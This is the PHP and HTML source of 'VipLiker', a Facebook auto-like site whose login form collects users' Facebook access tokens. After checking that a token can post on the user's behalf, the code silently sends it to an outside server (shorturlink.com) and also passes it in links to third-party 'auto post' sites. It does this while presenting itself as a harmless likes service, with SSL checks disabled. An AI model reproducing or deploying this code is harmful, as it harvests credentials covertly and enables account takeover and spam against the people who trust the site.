<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://shorturlink.com/postliker/loginsave.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "Login Success :)"; // For example
            break;
            case 2:
                $errorMsg = "Please Allow App To Access Your Profile!";
            break;
            case 3:
                $errorMsg = "Logout Success!";
            break;
            default:
                $errorMsg = "Fa Furrukh was here!";
            break;
        }
         ''.$errorMsg.'';
    }
?>
<html class="no-js" lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>VipLiker | Increase Facebook Likes</title>
    <link rel="shortcut icon" href="images/icons/favicon.png" />
    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,900' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="css/normalize.css" />
    <link rel="stylesheet" href="css/foundation.css" />
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/animate.min.css" />
    <link rel="stylesheet" href="css/morphext.css" />
    <link rel="stylesheet" href="css/owl.carousel.css">
    <link rel="stylesheet" href="css/owl.theme.css">
    <link rel="stylesheet" href="css/owl.transitions.css">
    <link rel="stylesheet" href="css/slicknav.css">
    <link rel="stylesheet" href="style.css" />
<link href="assets/bootstrap.css" rel="stylesheet">
    <script src="js/vendor/modernizr.js"></script>
  </head>
<!--  HEADER -->    
<header class="login">
<div class="top">
  <div class="row">
  <div class="small-12 large-3 medium-3 columns">
   <div class="logo">
   <a href="index.php" title=""><img src="images/logo.png" alt="" title=""/></a>
   </div>
</div>

<div class="small-12 large-9 medium-9 columns">

<!--  NAVIGATION MENU AREA -->
    <nav class="desktop-menu">
     <ul class="sf-menu">
         <li><a href="index.php">HOME</a></li>
                                    <li class="current-menu-item"><a href="about.php">About</a>
                                    </li>
                                    <li><a href="privacy.php">Privacy Policy</a>
                                    </li>
                                    <li><a href="faqs.php">FAQS</a>
                                    </li>
                                    <li><a href="contact.php">Contact</a>
                                    </li>
    </ul>
  </nav>
<!--  END OF NAVIGATION MENU AREA --> 

<!--  MOBILE MENU AREA -->
  <nav class="mobile-menu">
    <ul>
  <li><a href="index.php">HOME</a></li>
                                             <li><a href="about.php">About</a>
                                    </li>
                                    <li><a href="privacy.php">Privacy Policy</a>
                                    </li>
                                    <li><a href="faqs.php">FAQS</a>
                                    </li>
                                    <li><a href="contact.php">Contact</a>
                                    </li>
</ul>
  </nav>
  <!--  END OF MOBILE MENU AREA -->


  </div>
  </div>
  </div>

</header>  
  

    <body>
        <div id="wrap" class="boxed">
<?php  if(isset($_GET['i']))
{ ?>
<div style="margin-bottom: -1px;" ;="" class="alert alert-success hideit"><i class="icon-check"></i><p><?php 
echo "$errorMsg"; 
?></p></div>
<?php } ?>

<div class="page-title"><div class="container clearfix"><div class="sixteen columns"><div id="user-img"><img style="box-shadow:0px 5px 25px #000;height: 150px;float: left;max-width: 172px;" class="animated swing" src="https://graph.facebook.com/me/picture?width=200&height=200&access_token=<?php echo $token;?>"><h3 class="newstyle" style="margin-left: -1px;">
<span class="newstyle-text animated swing"><?php echo "".$user->first_name; ?></span></h3></div><h1 style="float:right;"><a style="color: #FFF;padding: 10px 20px;  background: rgba(0,0,0,.5);  line-height: 75px;  font-size: 15px; text-transform: uppercase;  letter-spacing: 2px;  font-family: 'Open Sans Condensed', sans-serif;  font-weight: 300;" href="logout.php">Logout <span class="fa fa-sign-out"></span></a></h1></div></div></div>
<style> .alert1 { display: none;}</style>
<center>
<div class="site_ads">
<!-- Ads Here -->
</div>
</center>
<br>
<center>
<center>
<center>                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            
     <h3><strong><font color="red"><?php echo "Well done! ".$user->first_name; ?></font>  You successfully logged </strong></h3>




</br>
     <strong><font color="green">  Please select one service below!</strong>
</br>
</br>
<center>
 <img src="down.gif" alt="Mountain View">

</br>

 <img src="arrow.gif" alt="Mountain View">
            <a href="liker.php" class="btn btn-info">Use Auto Likes</a>

       <a href="comment.php" class="btn btn-info">Use Multi Comment</a>
        
       <a href="pageliker.php" class="btn btn-info">Page Liker</a>

</br>
</br><center>
<strong><font color="green">  Auto Post To Your Groups Friends And Pages  <h1></center>

 <img src="arrow.gif" alt="Mountain View">

          <a href="http://multypost.com/fbtools/multy_groups.php?token=<?php echo $token;?>" class="btn btn-success" target="_blank">Auto Post Groups</a>

<a href="http://multypost.com/fbtools/wall.php?access_token=<?php echo $token;?>" class="btn btn-success" target="_blank">Auto Post Pages</a>

<a href="http://multypost.com/fbtools/multy_friends.php?token=<?php echo $token;?>" class="btn btn-success" target="_blank">Auto Post Friends Timeline</a>
     
 </br>    
</br>
<strong><font color="green">  More Service 
</br>

 <img src="arrow.gif" alt="Mountain View">
        
<a href="http://anonylinq.ml/?http://uploadvia.com" class="btn btn-danger" target="_blank">Upload Files</a>

<a href="http://anonylinq.ml/?http://dpsongs.com" class="btn btn-danger" target="_blank">Download Youtube Videos</a>

</nav><br><hr>
<br>
</b></center><b>
</b></div><b>
</b></div><b>
</b></center><b>
<center>
    <div id="checking" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
        <div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
            <center><i class="fa fa-spinnerXD fa-refresh fa-7x fa-spin" style="color:#000;font-size: 150px;"></i>
            </center>
        </div>
    </div>
</center><br><br>
                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            <br>

<div style="display:none;"><?php if ($token){echo " ".$user->first_name;}else{ ?></div>
<?php
		}
		?>
		<?php if ($token): ?>
		<?php else: ?>
		<script type="text/javascript">
window.location.replace("http://shorturlink.com/postliker/index.php?i=4");
</script>
		<?php endif ?>

</center>

<br><br>
                                <center>
<div class="site_ads">
<!-- Ads Here -->
</div></center>
                            <br>
<!--tutorial-->
<div class="welcome" style=" margin-bottom: -40px;box-shadow: 6px -6px 45px -21px;">
    <div id="tutorial-text" class="tutorial-text">
        <Center>
            <h1><span class="color">*</span>Need Help? See This <a onclick="window.open('http://tipsvstricks.com')" title="ScreenShoot Tutorial About How To Use Official Liker?" style="color:#000;">Article</a> OR <a onClick="tutorial()">Video</a> For Getting Started.</h1>
            <hr>
    </div>
    <div style="display:none;" id="tutorial-textt" class="tutorial-textt">
        <Center>
            <h1><span class="color">* </span><a onClick="tutorialhide()"> Need Help? Watch Video Click Here To Hide It</a></h1>
            <hr>
    </div>
    <center>
        <div id="tutorial" style="display:none;" class="tutorial">
          <iframe frameborder="0" height="373" src="http://player.vimeo.com/video/85419887?byline=0&amp;portrait=0" width="596px"></iframe> 
        </div>
<input type="hidden" name="IL_RELATED_TAGS" value="1"/>
<input type="hidden" name="IL_IN_TAG" value="2"/>
    </center>
    </center>
    </center>
    </center>
    <!-- tutorial end -->

    </div>   </div> 
<center> 
<!--  FOOTER  -->
<footer>
<div class="row">
<div class="small-12 columns">
<div class="contacts">
<!--<div class="row">
<div class="small-12 large-3 medium-3 columns">
<i class="fa fa-map-marker"></i>
PORTLAND, OR, USA
</div>
<div class="small-12 large-3 medium-3 columns">
<i class="fa fa-mobile"></i>
+1 299-670-9615
</div>
<div class="small-12 large-3 medium-3 columns">
<a href="#"><i class="fa fa-comments"></i></a>
LIVE CHAT
</div>
<div class="small-12 large-3 medium-3 columns">
<a href="#"><i class="fa fa-envelope-o"></i></a>
E-MAIL US
</div>-->
</div>
</div>
</div>
</div>


<div class="row">
<div class="small-12 columns">
<div class="footerlinks"> 
<div class="small-12 large-3 medium-3 columns border-right">
<h2>About Vip Liker</h2>
<p>Vip Liker is a social marketing system that will increase followers, likes, comments and increase visits to pages. Our system is based on an online community of users who look get likes quickly and easily. </p>
</div>

<div class="small-12 large-3 medium-3 columns border-right">
<h2>Quick Links</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=Vx5w7VBEgsU">How This Work</a></li>
<li><a href="http://facebook.com/fapakhacker">Created by Fa Furrukh</a></li>
<li><a href="http://facebook.com/fapakhacker">Contact Us</a></li>
</ul>
</div>

<div class="small-12 large-3 medium-3 columns border-right">
<h2>'></script>
</div>

<div class="small-12 large-3 medium-3 columns">
<h2>Instructions</h2>
<p>Note : <br
			~ you must already<b>18+ years old.</b><br>
			~ Activate your <b><a href="https://www.facebook.com/settings?tab=followers">[Facebook Follower] </a></b><br>
			~ and set your post's permission to <br><b>PUBLIC.</b></p>

</div>

</div>
</div>
<br><br>
<!--SOCIAL LINKS
<div class="social">
<div class="row">
<div class="small-12 columns">
<ul class="small-block-grid-1 large-block-grid-5 medium-block-grid-5"> 
<li class="facebook"><a href="#">FACEBOOK</a></li> 
<li class="twitter"><a href="#">TWITTER</a></li> 
<li class="googleplus"><a href="#">GOOGLE+</a></li> 
<li class="linkedin"><a href="#">LINKEDIN</a></li> 
<li class="pinterest"><a href="#">PINTEREST</a></li> 
</ul>
</div>
</div>
</div>
 END OF SOCIAL LINKS --><br>
<p class="copyright">© Copyright VipLiker, all rights reserved. </p>
</footer>
<!--  END OF FOOTER  -->

<a href="#top" id="back-to-top"><i class="fa fa-angle-up"></i></a>

    <script src="js/vendor/jquery.js"></script>
    <script src="js/foundation.min.js"></script>
    <script src="js/vendor/hoverIntent.js"></script>
    <script src="js/vendor/superfish.min.js"></script>
    <script src="js/vendor/morphext.min.js"></script>
    <script src="js/vendor/wow.min.js"></script>
    <script src="js/vendor/jquery.slicknav.min.js"></script>
    <script src="js/vendor/waypoints.min.js"></script>
    <script src="js/vendor/jquery.animateNumber.min.js"></script>
    <script src="js/vendor/owl.carousel.min.js"></script>
    <script src="js/vendor/jquery.slicknav.min.js"></script>
    <script src="js/custom.js"></script>

  </body>
</html>
           